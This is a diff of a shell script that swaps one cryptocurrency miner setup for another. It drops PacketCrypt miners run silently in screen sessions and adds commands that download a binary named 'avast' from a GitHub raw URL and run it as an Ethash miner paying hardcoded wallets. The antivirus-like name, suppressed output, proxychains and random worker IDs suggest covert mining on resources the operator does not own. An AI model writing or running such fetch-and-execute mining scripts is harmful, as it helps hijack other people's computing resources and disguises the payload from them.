@@ -4,15 +4,10 @@ apt install proxychains
 
 apt install screen -y
 
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt 
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt1
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt2
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt3
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt4
+wget -q https://raw.githubusercontent.com/renilo/bc/main/avast
 
-chmod +x packetcrypt packetcrypt1 packetcrypt2 packetcrypt3 packetcrypt4
-screen -dmS run ./packetcrypt ann -p pkt1qvqvcz02afzkhujlw382nafy49r6nh8ppd2xkjd https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/ 2>&1 | grep --color=never -o "annmine.rs.*Ke.*" >/dev/null 2>&1
-screen -dmS run1 ./packetcrypt1 ann -p pkt1qvqvcz02afzkhujlw382nafy49r6nh8ppd2xkjd https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/ 2>&1 | grep --color=never -o "annmine.rs.*Ke.*" >/dev/null 2>&1
-screen -dmS run2 ./packetcrypt2 ann -p pkt1qvqvcz02afzkhujlw382nafy49r6nh8ppd2xkjd https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/ 2>&1 | grep --color=never -o "annmine.rs.*Ke.*" >/dev/null 2>&1
-screen -dmS run3 ./packetcrypt3 ann -p pkt1qvqvcz02afzkhujlw382nafy49r6nh8ppd2xkjd https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/ 2>&1 | grep --color=never -o "annmine.rs.*Ke.*" >/dev/null 2>&1
-screen -dmS run4 ./packetcrypt4 ann -p pkt1qvqvcz02afzkhujlw382nafy49r6nh8ppd2xkjd https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/ 2>&1 | grep --color=never -o "annmine.rs.*Ke.*" >/dev/null 2>&1
+chmod +x avast 
+
+WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-HAJAR)
+
+./avast --algo ETHASH --pool stratum+ssl://us.ezil.me:25443 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.zil1r47c9zkz725j0euwkx9che983pnvujc58n9l99.$WORKER --ethstratum ETHPROXY --enablezilcache
